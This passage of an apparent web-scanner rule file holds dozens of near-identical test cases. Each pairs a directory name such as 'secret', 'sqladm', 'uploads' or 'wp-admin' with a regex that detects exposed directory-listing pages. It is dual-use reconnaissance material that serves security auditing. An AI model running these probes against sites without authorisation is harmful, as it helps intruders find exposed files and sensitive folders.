        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "root",
        "encode":  "NO",
    },

    {
        "case_id": 1060010065,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "sample",
        "encode":  "NO",
    },

    {
        "case_id": 1060010066,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "samples",
        "encode":  "NO",
    },

    {
        "case_id": 1060010067,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "script",
        "encode":  "NO",
    },

    {
        "case_id": 1060010068,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "scripts",
        "encode":  "NO",
    },

    {
        "case_id": 1060010069,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "secret",
        "encode":  "NO",
    },

    {
        "case_id": 1060010070,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "setup",
        "encode":  "NO",
    },

    {
        "case_id": 1060010071,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "sqladm",
        "encode":  "NO",
    },

    {
        "case_id": 1060010072,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "src",
        "encode":  "NO",
    },

    {
        "case_id": 1060010073,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "statistics",
        "encode":  "NO",
    },

    {
        "case_id": 1060010074,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "stats",
        "encode":  "NO",
    },

    {
        "case_id": 1060010075,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "temp",
        "encode":  "NO",
    },

    {
        "case_id": 1060010076,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "templates",
        "encode":  "NO",
    },

    {
        "case_id": 1060010077,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "test",
        "encode":  "NO",
    },

    {
        "case_id": 1060010078,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "tmp",
        "encode":  "NO",
    },

    {
        "case_id": 1060010079,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "upload",
        "encode":  "NO",
    },

    {
        "case_id": 1060010080,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "uploader",
        "encode":  "NO",
    },

    {
        "case_id": 1060010081,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "uploads",
        "encode":  "NO",
    },

    {
        "case_id": 1060010082,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "userfiles",
        "encode":  "NO",
    },

    {
        "case_id": 1060010083,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "web",
        "encode":  "NO",
    },

    {
        "case_id": 1060010084,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "web2",
        "encode":  "NO",
    },

    {
        "case_id": 1060010085,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "workarea",
        "encode":  "NO",
    },

    {
        "case_id": 1060010086,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "wp-admin",
        "encode":  "NO",
    },

    {
        "case_id": 1060010087,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "wp-content",
        "encode":  "NO",
    },

    {
        "case_id": 1060010088,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "wp-includes",
        "encode":  "NO",
    },

    {
        "case_id": 1060010089,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "~log",
        "encode":  "NO",
    },

    {
        "case_id": 1060010090,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "~logs",
        "encode":  "NO",
    },

    {
        "case_id": 1060010091,
